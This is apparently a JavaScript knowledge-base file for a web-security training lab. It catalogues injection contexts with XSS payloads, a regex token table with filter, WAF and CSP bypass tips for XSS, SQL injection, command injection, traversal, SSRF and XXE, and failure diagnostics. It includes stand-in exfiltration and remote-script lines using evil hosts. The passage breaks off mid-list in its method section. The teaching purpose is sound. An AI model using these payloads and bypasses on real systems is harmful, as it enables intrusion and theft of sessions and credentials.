/* ============================================================
   SecLab · payload-data.js
   The Payload Lab knowledge base: sink contexts, functional
   tokens, failure diagnostics and the systematic method.
   Philosophy: this is NOT a cheat sheet. It teaches the grammar
   of injection contexts so you can craft payloads that work in
   any environment, and understand WHY they fail when they do.
   ============================================================ */

const PLDATA = (() => {
  'use strict';

  /* ---------------- injection contexts ---------------- */
  const CONTEXTS = [
    {
      id: 'html-body', name: 'HTML body',
      snippet: '<p>Results for: {INJ}</p>',
      breakout: 'none: you start outside any tag',
      minPayload: '<img src=x onerror=alert(1)>',
      why: 'The HTML parser reads your input as markup. No quoting to escape: you simply open a new tag. The onerror event fires without any click because the src=x image fails to load.',
      escalate: 'Auto-firing events (onerror, onload) beat click events. For impact: read document.cookie (if cookies are not HttpOnly), or chain into an account action.',
      blocked: 'If < comes back as &lt; the app HTML-encodes output. Look for other reflection points: attributes, headers, the DOM, or a different page where the same data is rendered.'
    },
    {
      id: 'attr-double', name: 'Attribute, double-quoted',
      snippet: '<input value="{INJ}">',
      breakout: '" (close the attribute, then a space)',
      minPayload: '" onfocus=alert(1) autofocus="',
      why: 'The parser treats everything up to the next double quote as the value. Close the quote, add a space, and now you are writing attributes inside the tag. autofocus makes the field grab focus so onfocus fires automatically. The trailing =" re-opens and swallows the original closing quote.',
      escalate: 'onfocus+autofocus, onmouseover (needs hover), oninput on form fields. Type="text" fields beat hidden ones.',
      blocked: 'If " is encoded as &quot;: you cannot close the attribute. Check whether single quotes are left intact somewhere, whether the same value lands in a script context, or whether unquoted attributes appear in other templates.'
    },
    {
      id: 'attr-single', name: 'Attribute, single-quoted',
      snippet: "<input value='{INJ}'>",
      breakout: "' (close the attribute, then a space)",
      minPayload: "' onfocus=alert(1) autofocus='",
      why: 'Identical logic to the double-quoted case, one character earlier on your keyboard. The parser stops the value at the first single quote it meets.',
      escalate: 'Same events as the double-quote context. Also test whether double quotes survive here: mixed quoting sometimes means the encoding only protects one style.',
      blocked: "If ' is encoded: same escape plan as the double-quote context: find another sink for this value."
    },
    {
      id: 'attr-unquoted', name: 'Attribute, unquoted',
      snippet: '<input value={INJ}>',
      breakout: 'a single space (ends the value)',
      minPayload: 'x onfocus=alert(1) autofocus=y',
      why: 'Unquoted values end at the first whitespace. One space and you are injecting attributes directly. The leading x keeps the original value syntactically valid.',
      escalate: 'This context is a gift: no quote gymnastics at all. Only spaces and some encoding of the value block you.',
      blocked: 'If spaces are encoded or stripped, try other attribute separators the parser respects: / (in some tags), tab characters (%09), or newline (%0a).'
    },
    {
      id: 'href-url', name: 'URL attribute (href / src)',
      snippet: '<a href="{INJ}">read more</a>',
      breakout: 'none needed for scheme injection: the URL itself is the payload',
      minPayload: 'javascript:alert(1)',
      why: 'The value is parsed as a URL, and the javascript: scheme is executable. No quoting to escape: you are not breaking out, you are abusing what the attribute legitimately accepts. data:text/html,<script>...</script> is the sibling trick.',
      escalate: 'Needs one click: craft a believable link (button styling, familiar wording). data: URLs let you build a whole fake page. Check whether the site renders your URL in mails or notifications: wider reach.',
      blocked: 'Scheme validation (only http/https allowed), or the app prefixes your input with http://. Try //evil.com (protocol-relative) for open redirects, or check whether javascript&colon; (HTML entity) decodes after sanitization.'
    },
    {
      id: 'js-string-double', name: 'JS string, double-quoted',
      snippet: '<script>var q = "{INJ}";</script>',
      breakout: '"; (close the string, end the statement)',
      minPayload: '";alert(1);//',
      why: 'Two parsers are stacked here. The HTML parser extracts the script block first; THEN JavaScript parses its contents. To run code you close the string with ", end the statement with ;, run your payload, and comment out the trailing quote with //. The alternative breakout: inject </script> which the HTML parser honors even inside a JS string, because the HTML layer does not understand quotes.',
      escalate: 'The </script><img src=x onerror=...> variant sidesteps every JS-level escaping. If quotes are escaped, that is usually still available.',
      blocked: 'If " comes back as \\" (backslash-escaped) the app escapes strings JS-style. Then switch to the HTML-layer breakout: </script>. If angle brackets also die, test the template literal and attribute contexts for the same data.'
    },
    {
      id: 'js-string-single', name: 'JS string, single-quoted',
      snippet: "<script>var q = '{INJ}';</script>",
      breakout: "'; (close the string, end the statement)",
      minPayload: "';alert(1);//",
      why: 'Same double-parser story with single quotes. Note that PHP and many backends escape double quotes but forget single ones (or the reverse): always test both.',
      escalate: 'Same as the double-quote JS context, including the </script> escape hatch.',
      blocked: "If ' is escaped: try the </script> breakout, or check whether the string is actually a template literal."
    },
    {
      id: 'js-template', name: 'JS template literal',
      snippet: '<script>var q = `{INJ}`;</script>',
      breakout: 'none needed: ${...} executes inside the literal',
      minPayload: '${alert(1)}',
      why: 'Template literals evaluate everything inside ${ }. This is the only string context where you do not need to break out at all: the interpolation IS the execution. The backtick only matters if you want to escape the string entirely.',
      escalate: 'Read variables in scope, call functions, fetch other origins. Template literals usually appear in modern front-ends where lots of interesting state lives in reach.',
      blocked: 'If ${ is filtered or the backtick is escaped: check whether the escaping is only on backticks (then you cannot leave the string, but ${} may still run: encoding of { is rare).'
    },
    {
      id: 'js-code', name: 'JS code block (eval sink)',
      snippet: '<script>{INJ}</script>',
      breakout: 'none: you are already writing code',
      minPayload: 'alert(1)',
      why: 'Your input lands directly in a JavaScript execution position: an eval(), new Function(), setTimeout with a string, or inline between script tags. There is nothing to escape: the payload is just code.',
      escalate: 'Full script execution: fetch exfil, keyloggers, session actions. This context has the highest impact ceiling of all.',
      blocked: 'If keywords are blacklisted, read the filter section: mixed case, string construction, String.fromCharCode, or split expressions usually defeat keyword lists.'
    },
    {
      id: 'html-comment', name: 'HTML comment',
      snippet: '<!-- {INJ} -->',
      breakout: '--> (ends the comment)',
      minPayload: '--><img src=x onerror=alert(1)>',
      why: 'Everything between <!-- and --> is inert, but the terminator is yours to write. Close the comment and you are back in HTML body context.',
      escalate: 'After the breakout this is the plain HTML body context: all its payloads apply.',
      blocked: 'If --> is filtered: browsers historically accepted quirky terminators (--!>, and markup-declaration-open states). If the comment is written server-side with your data never included, this context does not exist.'
    },
    {
      id: 'css-string', name: 'CSS string / style block',
      snippet: "<style>body { background: url('{INJ}') }</style>",
      breakout: "');} then close the style tag at the HTML layer",
      minPayload: "');}</style><img src=x onerror=alert(1)>",
      why: 'Modern CSS has no JavaScript execution (expression() died with old IE), so the practical path is closing the CSS context and jumping layers: escape the string, close the rule, close the <style> element, then write HTML.',
      escalate: 'Inside CSS-only injection, url() can exfiltrate data one request at a time (attribute selectors as an oracle). The style escape is stronger.',
      blocked: 'If < is encoded inside style blocks too, pure CSS injection remains: url(//evil/?) exfil and attr() tricks, but no script execution.'
    }
  ];

  /* ---------------- functional tokens for the X-ray ---------------- */
  /* re: regex, cat: class, name, what, why, bypass */
  const TOKENS = [
    { re: /<\/script>/i, cat: 'xss', name: '</script> (script block terminator)',
      what: 'Closes the script element at the HTML layer.',
      why: 'The HTML parser does not understand JavaScript strings: it ends the <script> block at this literal sequence no matter where it appears. That makes it a breakout that survives JS-level quote escaping.',
      bypass: 'Variants: </SCRIPT>, </script\\x20>, </script/>.' },
    { re: /<script[\s>]/i, cat: 'xss', name: '<script> tag',
      what: 'Opens a script element.',
      why: 'The classic execution primitive. Modern CSP blocks inline scripts, which is why event handlers on other tags are now more common in real exploits.',
      bypass: 'If the literal is filtered: <scr<script>ipt> (naive strippers reassemble it), mixed case <ScRiPt>, or use <img>/<svg> with event handlers instead.' },
    { re: /<img[^>]*>/i, cat: 'xss', name: '<img> tag',
      what: 'Image element, the usual carrier for onerror.',
      why: 'src=x fails to load, so onerror fires with zero user interaction. The shortest reliable auto-execution vehicle in HTML.',
      bypass: 'Shorter than script and rarely blocked as hard: <svg onload=...> is the sibling when img is filtered.' },
    { re: /<svg[\s>]/i, cat: 'xss', name: '<svg> tag',
      what: 'SVG namespace element.',
      why: 'Enters the SVG namespace where onload works on the root element, giving the shortest known auto-firing payloads: <svg onload=alert(1)>.',
      bypass: 'Also carries <svg><animate onbegin=...> for environments blocking onload.' },
    { re: /<iframe[\s>]/i, cat: 'xss', name: '<iframe> tag',
      what: 'Nested browsing context.',
      why: 'Loads a whole page inside the page: used for fake login overlays (credential stealing) and sandbox escapes when srcdoc is in play.',
      bypass: 'srcdoc= is the modern trick: the attribute value is a full HTML document.' },
    { re: /onerror\s*=/i, cat: 'xss', name: 'onerror= event handler',
      what: 'Fires when the element fails to load.',
      why: 'No click needed. Pairs with deliberately broken sources (src=x): the error is the trigger.',
      bypass: 'If onerror is blacklisted: onabort, onblur+autofocus, onfocus+autofocus, onwheel, onpointerover. If parentheses die: onerror=alert\\x281\\x29 or HTML entities inside the attribute.' },
    { re: /onload\s*=/i, cat: 'xss', name: 'onload= event handler',
      what: 'Fires when the element finishes loading.',
      why: 'Auto-execution on elements that do load: <svg onload=...>, <body onload=...>, <iframe onload=...>.',
      bypass: 'Same alternates as onerror when filtered.' },
    { re: /\son[a-z]+\s*=/i, cat: 'xss', name: 'event handler attribute (on*)',
      what: 'Any inline event binding.',
      why: 'Event handlers are HTML attributes: if you can write an attribute in a tag you control, you get execution. The event only needs to actually fire.',
      bypass: 'Pick events that fire without interaction (onerror, onload, onfocus with autofocus) over click/hover events when impact matters.' },
    { re: /javascript:/i, cat: 'xss', name: 'javascript: URL scheme',
      what: 'Executable URL scheme.',
      why: 'In href/action/formaction attributes the URL is not just an address: javascript: makes the navigation execute code. Needs one click.',
      bypass: 'Case games (JaVaScRiPt:), entities (java&Tab;script:), whitespace and control characters inside the scheme, data:text/html;base64 as the scheme sibling.' },
    { re: /data:text\/html/i, cat: 'xss', name: 'data: HTML URL',
      what: 'Embeds a full document inside the URL.',
      why: 'Lets you ship an entire attacker page in the link itself. Blocked by top-level navigation rules in modern browsers but alive in iframes and href.',
      bypass: 'Base64 form data:text/html;base64,... defeats quote and tag filters because the payload is just letters.' },
    { re: /srcdoc\s*=/i, cat: 'xss', name: 'srcdoc= (inline iframe document)',
      what: 'An iframe whose document is an attribute value.',
      why: 'The whole victim page rides inside one attribute: no separate request, often missed by filters that only inspect full tags.',
      bypass: 'Entities inside srcdoc decode before rendering, so encoding parts of the payload is the norm, not a hack.' },
    { re: /\balert\s*\(/i, cat: 'xss', name: 'alert( proof of execution',
      what: 'The canonical XSS proof.',
      why: 'alert is not the goal, it is the smoke test. Programs want impact: document.domain, credential access, or actions on the victim account.',
      bypass: 'Filtered? confirm(1), prompt(1), print(), throw 1, or alert(document.domain) prove the same thing with different words.' },
    { re: /document\.cookie/i, cat: 'xss', name: 'document.cookie',
      what: 'Reads the cookies the page can see.',
      why: 'Classic credential theft. Note the honest limit: HttpOnly cookies are invisible to JavaScript, and modern session cookies usually are HttpOnly.',
      bypass: 'When cookies are protected, the impact path is session riding: perform authenticated actions from the victim browser instead of stealing tokens.' },
    { re: /document\.domain/i, cat: 'xss', name: 'document.domain',
      what: 'The origin of the current page.',
      why: 'The standard way to show execution ON the target domain (not a data: or about: page). Most programs accept this as the XSS proof point.',
      bypass: '' },
    { re: /String\.fromCharCode/i, cat: 'xss', name: 'String.fromCharCode(...)',
      what: 'Builds a string from character codes.',
      why: 'Defeats filters that match words: the payload contains no words, only numbers. The filter sees digits, the engine assembles the attack.',
      bypass: 'Siblings: atob("..."), unescape("%.."), \\xNN and \\uNNNN escape sequences.' },
    { re: /\beval\s*\(/, cat: 'xss', name: 'eval(',
      what: 'Executes a string as code.',
      why: 'When you find eval(userdata) you found a direct code execution sink. Rare but catastrophic.',
      bypass: '' },
    { re: /(setTimeout|setInterval)\s*\(\s*['"`]/, cat: 'xss', name: 'setTimeout with a string',
      what: 'Timer that EVALUATES string arguments.',
      why: 'The forgotten eval: passing a string to setTimeout runs it as code. Code auditors look for eval and miss this sibling.',
      bypass: 'Also Function("...")() and new Function(...) are the same class of sink.' },
    { re: /(innerHTML|outerHTML|insertAdjacentHTML|document\.write)/i, cat: 'xss', name: 'HTML sink (innerHTML family)',
      what: 'DOM sinks that parse strings as markup.',
      why: 'The main DOM XSS route: data flows from location, postMessage or fetch into these sinks without sanitization.',
      bypass: 'If the framework escapes it, look for .onevent assignment and jQuery $(html) patterns as alternates.' },
    { re: /union[\s+]+(all[\s+]+)?select/i, cat: 'sqli', name: 'UNION SELECT',
      what: 'SQL injection: appends attacker rows to the query result.',
      why: 'UNION SELECT is how you read other tables: match the column count, then read information_schema and data.',
      bypass: 'Case (UnIoN), comments between words (UNION/**/SELECT), URL encoding of spaces.' },
    { re: /'\s*(or|and)\s+1\s*=\s*1/i, cat: 'sqli', name: "' OR 1=1",
      what: 'SQL injection: tautology that matches all rows.',
      why: 'The probe that distinguishes string-context SQLi from nothing: if the response changes (all rows, login bypass), the quote reached the query parser.',
      bypass: "If quotes are escaped: numeric context injection (no quotes needed), or \\' tricks, or wide-byte when the charset is GBK." },
    { re: /(^|[^-])--\s*$|--\s/, cat: 'sqli', name: '-- (SQL comment)',
      what: 'Comments out the rest of the SQL line.',
      why: 'Kills the trailing quote and the rest of the original query so your injection stands alone.',
      bypass: '# does the same in MySQL; /* */ in everything.' },
    { re: /\b(sleep|waitfor|pg_sleep|benchmark)\s*\(/i, cat: 'sqli', name: 'time-based blind function',
      what: 'Delays the database response.',
      why: 'The blind SQLi oracle: when you cannot see output, you can hear time. A delayed answer IS data exfiltration, one bit at a time.',
      bypass: 'Heavy alternatives when sleep is blocked: benchmark(), big cartesian products.' },
    { re: /;\s*(cat|id|whoami|ls|wget|curl|nc|bash|sh)\b/i, cat: 'cmdi', name: 'command separator + command',
      what: 'Command injection: runs a second command after the first.',
      why: 'The semicolon ends the first command in the shell; everything after it is a new program. That is full server code execution if the input reaches a shell.',
      bypass: 'Also && (only if the first succeeds), || (if it fails), | (pipe), backticks and $() (substitution inline).' },
    { re: /&&|\|\|/, cat: 'cmdi', name: '&& / || (conditional chaining)',
      what: 'Runs the next command based on the previous result.',
      why: 'Often survives filters that strip semicolons. The behavior difference (only-if-success vs only-if-failure) is also a boolean oracle.',
      bypass: '' },
    { re: /`[^`]*`/, cat: 'cmdi', name: 'backticks (command substitution)',
      what: 'Executes the enclosed text and inserts its output.',
      why: 'Inline substitution: the output lands INSIDE the original command line, which enables building commands from pieces.',
      bypass: '$(...) is the modern form and survives some old-school filters.' },
    { re: /\$\(/, cat: 'cmdi', name: '$( ) (command substitution)',
      what: 'Executes and substitutes, like backticks.',
      why: 'Nested cleanly: $( $(...) ) works, and filters that hunt backticks often miss it.',
      bypass: '' },
    { re: /\|\s*\w+/, cat: 'cmdi', name: '| (pipe)',
      what: 'Feeds the first command output into the next.',
      why: 'Pipe-based injection often passes where ; is stripped, and gives you output directly.',
      bypass: '' },
    { re: /\.\.\//, cat: 'trav', name: '../ (parent directory)',
      what: 'Path traversal: walks up the directory tree.',
      why: 'If the app joins your input into a file path, each ../ cancels one directory. Enough of them land you at the filesystem root.',
      bypass: 'Filters stripping ../ can be defeated with ....// (stripping the inner leaves the outer), encoded forms %2e%2e%2f, double-encoded %252e%252e%252f, and ..;/ on some servers.' },
    { re: /\/etc\/(passwd|shadow|hosts)/i, cat: 'trav', name: '/etc/passwd target',
      what: 'The canonical traversal proof file.',
      why: 'Readable everywhere, exists on every Linux system, and its contents prove the file read beyond doubt. shadow needs root, so passwd is the honest test.',
      bypass: 'On Windows: C:\\windows\\win.ini. Java apps: WEB-INF/web.xml.' },
    { re: /169\.254\.169\.254/i, cat: 'ssrf', name: 'cloud metadata endpoint',
      what: 'The link-local address serving cloud instance credentials.',
      why: 'In AWS, GCP, Azure and friends this address hands out instance credentials and tokens. SSRF to it is often an instant critical finding.',
      bypass: 'Redirect-based access, DNS rebinding, decimal/hex IP encodings (http://169.254.169.254 = http://2852039166), and 0.0.0.0 or [::] alternatives when blocked.' },
    { re: /metadata\.google\.internal|localhost|127\.0\.0\.1|\[::1\]|0\.0\.0\.0/i, cat: 'ssrf', name: 'internal address',
      what: 'Loopback or internal-network target.',
      why: 'The core of SSRF: making the server talk to itself. Internal admin panels and databases often have no authentication because "nobody can reach them".',
      bypass: 'Encodings of 127.0.0.1: 2130706433 (decimal), 0x7f.0.0.1 (hex), 017700000001 (octal).' },
    { re: /file:\/\/|gopher:\/\//i, cat: 'ssrf', name: 'file:// / gopher:// scheme',
      what: 'Dangerous URL schemes.',
      why: 'file:// reads local files through the SSRF, gopher:// speaks raw protocols (SMTP, Redis) to internal services. Most HTTP clients should refuse them; some forget.',
      bypass: '' },
    { re: /\{\{[^}]*\}\}/, cat: 'ssti', name: '{{ }} (template expression)',
      what: 'Server-side template injection marker (Jinja2, Twig, Handlebars...).',
      why: 'If the template ENGINE evaluates your input, {{7*7}} coming back as 49 proves code evaluation on the server. The engine fingerprint (49, 7777777, errors) identifies the product.',
      bypass: 'Blocked braces: {%%} statement blocks, {% raw %} tricks, or the engine-specific filters chain for RCE.' },
    { re: /\$\{[^}]*\}/, cat: 'ssti', name: '${ } (expression interpolation)',
      what: 'Expression marker in many engines (EL, Freemarker, JS template literals).',
      why: 'Ambiguous by design: in the browser it is a template literal, on the server it may be Freemarker or EL reaching Java. The response tells you which world you are in.',
      bypass: '' },
    { re: /<%[^%]*%>/, cat: 'ssti', name: '<% %> (ERB-style injection)',
      what: 'Ruby/Java template expression.',
      why: 'ERB and JSP style markers. Ruby ERB gives remote code execution with almost no ceremony.',
      bypass: '' },
    { re: /__proto__|constructor\[('|")prototype/, cat: 'misc', name: 'prototype pollution marker',
      what: 'Reaches JavaScript object prototypes.',
      why: 'Polluting Object.prototype changes behavior for every object in the process: gadget chains turn this into XSS, authentication bypass, or RCE in Node.',
      bypass: '' },
    { re: /<!ENTITY|<!DOCTYPE/i, cat: 'misc', name: 'XXE declaration',
      what: 'XML external entity.',
      why: 'If the XML parser resolves entities, defining one with SYSTEM gives it file read. The DOCTYPE is where the attack is declared.',
      bypass: 'Blind XXE: out-of-band entity loading with your own DTD over HTTP.' },
    { re: /%00|\\x00|\x00/, cat: 'misc', name: 'null byte',
      what: 'Terminates strings in C-based code paths.',
      why: 'Historically truncated filenames and filters: "avatar.png%00.jpg" was validated as .jpg and saved as .png. Modern parsers resist it, but file logic is still where it lives.',
      bypass: '' },
    { re: /%0d%0a|\r\n/, cat: 'misc', name: 'CRLF (carriage return + line feed)',
      what: 'Injects new lines into headers and logs.',
      why: 'In responses it splits HTTP headers (session fixation, cache poisoning); in logs it forges log entries.',
      bypass: '' },
    { re: /\/\/[a-z0-9.-]+\.[a-z]{2,}/i, cat: 'misc', name: '//host (protocol-relative redirect)',
      what: 'Open redirect carrier.',
      why: 'Redirect endpoints that check "starts with /" are defeated by //evil.com: the double slash means "use my current scheme, different host".',
      bypass: 'Also https:evil.com in lenient parsers, and backslash \\evil.com in some.' },
    { re: /%25[0-9a-f]{2}/i, cat: 'misc', name: 'double URL encoding (%25xx)',
      what: 'An encoded percent sign.',
      why: 'When the app decodes your input TWICE (storage and output, or proxy plus app), %253C becomes %3C at layer one and < at layer two. Filters that look once see nothing.',
      bypass: 'Triple encoding for three-layer stacks.' },
    { re: /&#x?[0-9a-f]+;/i, cat: 'misc', name: 'HTML entity encoding',
      what: 'Numeric character reference.',
      why: 'Legitimate output encoding BECOMES an attack when the decode happens after the filter: filters see &#x3c;, the browser renders <.',
      bypass: 'Named (&lt;), decimal (&#60;), hex (&#x3c;), unpadded and mixed forms.' },
    { re: /\\x[0-9a-f]{2}|\\u[0-9a-f]{4}/i, cat: 'misc', name: 'JS escape sequence',
      what: 'JavaScript string escapes.',
      why: 'Payloads written as \\x3c\\x73\\x63\\x72\\x69\\x70\\x74 contain no filter-triggering words but assemble the attack at runtime.',
      bypass: '' },
    { re: /\beyJ[a-zA-Z0-9_-]+\./, cat: 'misc', name: 'JWT marker (eyJ...)',
      what: 'Base64 of {" marks a JSON Web Token.',
      why: 'Decoding the three segments exposes the header and claims. The classic student mistakes live here: alg none, weak HMAC secrets, algorithm confusion with RS256 to HS256.',
      bypass: 'Feed it to the Decode tab to peel all three layers.' },
    { re: /7\s*\*\s*7/, cat: 'ssti', name: '7*7 (SSTI arithmetic probe)',
      what: 'Template evaluation canary.',
      why: '49 in the response means the template engine is evaluating your input. 7777777 identifies specific engines. Cheapest possible proof with zero destructive potential.',
      bypass: '' }
  ];

  /* ---------------- why payloads fail ---------------- */
  const DIAGNOSTICS = [
    {
      id: 'd1', symptom: 'It works in Burp Repeater but not in the browser',
      cause: 'The browser request differs from yours: encoding of special characters, headers, or a proxy normalizing the URL.',
      confirm: 'In the browser DevTools Network tab, compare the actual request the browser sends with your Repeater request byte by byte (params, encoding, headers).',
      fix: 'Replay the EXACT browser request in Repeater: right-click the failed request in DevTools, copy it (Copy as cURL), and load it into Repeater. Then modify one thing at a time.'
    },
    {
      id: 'd2', symptom: 'My tag appears in the HTML source but nothing executes',
      cause: 'Content Security Policy is blocking inline code. The tag is there, the browser refuses to run it.',
      confirm: 'Open DevTools Console after loading: CSP violations are printed in red ("Refused to execute inline script..."). Check the Content-Security-Policy response header.',
      fix: 'Read the policy: script-src with unsafe-inline means inline handlers should work (your bug is elsewhere). A nonce or strict policy means you need an allowed-script gadget: JSONP endpoints, uploaded files on the same origin, or script gadgets in allowed libraries.'
    },
    {
      id: 'd3', symptom: 'My quotes come back as \\" (backslash-escaped)',
      cause: 'The app escapes strings JavaScript-style, so you cannot close the string with a quote.',
      confirm: 'Look at the raw response: " in your input becomes \\" in the reflection.',
      fix: 'Escape the escaping layer entirely: the HTML parser ends the script block at a literal </script> even inside a JS string. Inject </script><img src=x onerror=alert(1)>. If angle brackets are also encoded, check the attribute and template-literal contexts for the same data.'
    },
    {
      id: 'd4', symptom: 'My < comes back as &lt; everywhere',
      cause: 'Output encoding is doing its job in this reflection point.',
      confirm: 'View the response source (not the rendered page): &lt; where your < was.',
      fix: 'Encoding is context-specific. Hunt for sinks where it is NOT applied: HTTP headers (custom header reflection), file names, error pages, a different template for the same data, JSON responses consumed by client-side rendering, or DOM sinks that read location directly.'
    },
    {
      id: 'd5', symptom: 'My input is cut off after N characters',
      cause: 'A length limit: database column size, application validation, or HTML attribute maxlength (only client side).',
      confirm: 'Count how many characters survive. Test if maxlength in the HTML is the limiter by removing it in DevTools and resubmitting.',
      fix: 'Go minimal: <svg onload=alert(1)> is 19 characters. If even that does not fit, use shorter vectors (onfocus=alert(1) autofocus needs a host tag), or point at an external resource (src=//evil/x.js style chaining) if the context allows attributes.'
    },
    {
      id: 'd6', symptom: 'It worked once, then stopped working',
      cause: 'A WAF learned the signature, rate limiting kicked in, or a cache is serving the safe version.',
      confirm: 'Wait a few minutes and retry. Change one harmless byte (a different image src) and retry: if that works, a signature is being remembered.',
      fix: 'Vary the payload cosmetically (spacing, casing, encoding) while keeping the semantics. For caches: append a cache-busting parameter. If a WAF is truly learning, document the detection as part of your finding: the bypass is the finding.'
    },
    {
      id: 'd7', symptom: '<script> is blocked but other tags pass',
      cause: 'A blacklist on the script tag specifically.',
      confirm: 'Try <b>test</b>: does formatting apply? Then <script> vs <img> vs <svg>: find which tags die.',
      fix: 'Do not use <script>. Event handlers on allowed tags carry execution: <img src=x onerror=alert(1)>, <svg onload=alert(1)>, <details open ontoggle=alert(1)>. Blacklists lose because the HTML event surface is enormous.'
    },
    {
      id: 'd8', symptom: 'alert( is filtered',
      cause: 'Keyword blacklist on the alert function (or parentheses).',
      confirm: 'Test which half is blocked: onerror=alert vs onerror=x(1).',
      fix: 'Synonyms: confirm(1), prompt(1), print(), throw 1. If parentheses die: use HTML entities inside attributes (onerror="&#97;lert(1)" decodes before execution) or backtick template arguments (onerror=alert`1`) where the context allows.'
    },
    {
      id: 'd9', symptom: 'My input never appears in the response at all',
      cause: 'Blind processing: the value is stored, consumed by backend logic, or rendered on another page.',
      confirm: 'Search the whole response (including headers) for your canary. Check where else your input surfaces: profile pages, admin views, emails, other users\' views.',
      fix: 'Switch to blind techniques: time-based oracles, out-of-band callbacks (your collaborator/Burp Collaborator style endpoint), or find the second page where the value lands and attack THAT context.'
    },
    {
      id: 'd10', symptom: 'The payload only fires after I click or hover',
      cause: 'You chose an interaction event (onclick, onmouseover) where an automatic one exists.',
      confirm: 'Compare the event list: onerror and onload fire on their own; onmouseover needs a pointer over the element.',
      fix: 'Use auto-firing pairs: onerror with a broken source, onload on svg/body, onfocus with autofocus= on an input. Impact proofs need reliability, not audience participation.'
    },
    {
      id: 'd11', symptom: 'The WAF blocks the whole request (403 / blocked page)',
      cause: 'Request-level filtering before the app sees anything.',
      confirm: 'Send the same request with the payload in a different place (header, another param, body): if only payload-bearing requests die, the WAF inspects content.',
      fix: 'Encoding layers: URL-encode parts (or double-encode), case variation, comment splitting inside JS (ale/**/rt), parameter pollution (send the param twice: filters see fragments, parsers see one), chunked transfer encoding. If every route is blocked, report the WAF bypass attempt honestly with what you tried.'
    },
    {
      id: 'd12', symptom: 'My injection lands in a JSON response and nothing happens',
      cause: 'application/json responses are data, not markup: the browser will not parse them as HTML.',
      confirm: 'Check the Content-Type header of the response where your payload lands.',
      fix: 'Find the CLIENT that consumes this JSON. Front-ends that innerHTML JSON values into the page re-create the XSS on the rendering side. Also check file-upload names inside JSON, and content sniffing edge cases (only when served as text/html).'
    },
    {
      id: 'd13', symptom: 'The input works in the URL bar but not when the page loads it',
      cause: 'The fragment (#) never reaches the server: this is DOM territory, and the sink is client-side JavaScript.',
      confirm: 'Grep the JavaScript for location.hash, location.search, document.URL flowing into sinks (innerHTML, eval, jQuery selectors).',
      fix: 'Attack the client-side flow directly: the server-side filters are irrelevant because the server never sees the fragment. Your payload only needs to satisfy the client sink, as in the JS contexts reference.'
    },
    {
      id: 'd14', symptom: 'Everything is escaped and I am out of ideas',
      cause: 'The app is well-defended in this context. That is a finding about the app, not a failure of yours.',
      confirm: 'Write down what you tested: contexts probed, characters and their fates, defenses identified.',
      fix: 'Move methodically to the next surface: other parameters, headers (Referer, User-Agent in logs or analytics), file uploads, stored fields, POST bodies, WebSocket messages, JSON keys (not just values). And remember: a negative result with documentation is still professional work. Timebox it and move on.'
    }
  ];

  /* ---------------- the method ---------------- */
  const METHOD = [
    {
      id: 'm1', title: 'Map the terrain', icon: 'crosshair',
      goal: 'Know every input and every place it surfaces, before touching a single payload.',
      items: [
        'Inputs: URL parameters, POST body fields, JSON keys AND values, headers (Referer, User-Agent, X-Forwarded-For), cookies, file names, path segments, and the URL fragment (#) which never reaches the server.',
        'Surfaces: where does each input appear? HTML body, attributes, inside script blocks, in CSS, in HTTP responses headers, stored and shown later, or consumed by client-side JavaScript.',
        'Tools: your browser. View-source (what the server sent) vs DevTools Elements (what JavaScript built) tells you server-side from DOM rendering in one glance.'
      ],
      lesson: 'Reading the app like a blueprint starts here: the SAME value often renders in five places with five different encodings. You are hunting for the one place where the guards forget to look.'
    },
    {
      id: 'm2', title: 'Send the canary', icon: 'target',
      goal: 'One probe string reveals the context and the defense in a single round trip.',
      probe: 'zbx9<x>"\'`${}',
      items: [
        'Send the canary and view the RAW response (not the rendered page).',
        'Track the fate of EVERY special character: which survived raw, which were encoded, which vanished, which broke the page.',
        'Do this for each input surface you mapped in step 1. The results differ more often than you expect.'
      ],
      lesson: 'The canary replaces guessing with observation. Ten seconds of probing answers what an hour of throwing payload lists never will.'
    },
    {
      id: 'm3', title: 'Read the reflection like a blueprint', icon: 'eye',
      goal: 'Deduce the exact sink context from the character fates.',
      interp: [
        ['< survives raw', 'HTML body or unencoded attribute context: tags are yours'],
        ['< becomes &lt;', 'HTML output encoding: this reflection point is defended'],
        ['< vanishes', 'Tag stripping: test reassembly tricks (scr<script>ipt)'],
        ['" becomes &quot;', 'Attribute encoding: you cannot close a double-quoted attribute here'],
        ["' survives inside a script block", 'JS string context: try closing with \' and running code'],
        ['backtick survives in a script block', 'Possible template literal: try ${...} with no breakout'],
        ['Nothing reflected anywhere', 'Blind or stored: check DOM, other pages, out-of-band'],
        ['Input after # works but never in the server response', 'DOM XSS: the sink is client-side JavaScript']
      ],
      items: [
        'Match your observations against the interpretation table.',
        'Confirm the context guess: the Context Lab in the next tab shows the sink examples.'
      ],
      lesson: 'Every character fate is a fact about the defense. Facts accumulate into the payload; guessing just burns requests and WAF attention.'
    },
    {
      id: 'm4', title: 'Classify the defense', icon: 'shield',
      goal: 'Know WHICH wall you are facing: none, encoding, blacklist, parser, or CSP.',
      items: [
        'No defense: <b>test</b> renders bold and your canary survives whole.',
        'Encoding: your characters come back as entities or escapes. You cannot fight this in-place: find another sink.',
        'Blacklist: SOME tags or words die while others pass. <script> blocked but <svg> alive is the classic signature. Blacklists are beatable because they are lists.',
        'Parser-based sanitization (DOMPurify and friends): almost everything passes but dangerous combinations are rewritten. These are hard: look for version-specific bypasses or misconfigurations (ALLOW_UNKNOWN_PROTOCOLS, ADD_TAGS).',
        'CSP: everything reflects perfectly and nothing executes. The wall is not in the page but in the policy header.'
      ],
      probe: '<b>bold</b><i>italic</i><u>underline</u>',
      lesson: 'Five different walls, five different plans. Most wasted effort in web hacking comes from fighting the wrong wall with the right payload.'
    },
    {
      id: 'm5', title: 'Craft the minimal payload', icon: 'wrench',
      goal: 'Prove execution with the SMALLEST change that works, built for the exact context.',
      items: [
        'Pick the context rule from the Context Lab: the breakout sequence and the payload follow from the grammar, not from a list.',
        'Start minimal: alert or document.domain proof, not a full attack chain.',
        'Prefer auto-firing events (onerror, onload, onfocus+autofocus) so your proof needs no interaction.',
        'Only after execution is proven do you escalate: reading data, performing actions, chaining.'
      ],
      lesson: 'The payload is the last step, not the first. When you understand why each character is needed, you can rebuild it for any filter, any framework, any context. That is the fishing lesson.'
    },
    {
      id: 'm6', title: 'Escalate with intent', icon: 'trending',
      goal: 'Turn a proof into demonstrated impact, ethically and proportionately.',
      items: [
        'Proof of execution: alert(document.domain) shows code runs on the real origin (programs usually accept exactly this).',
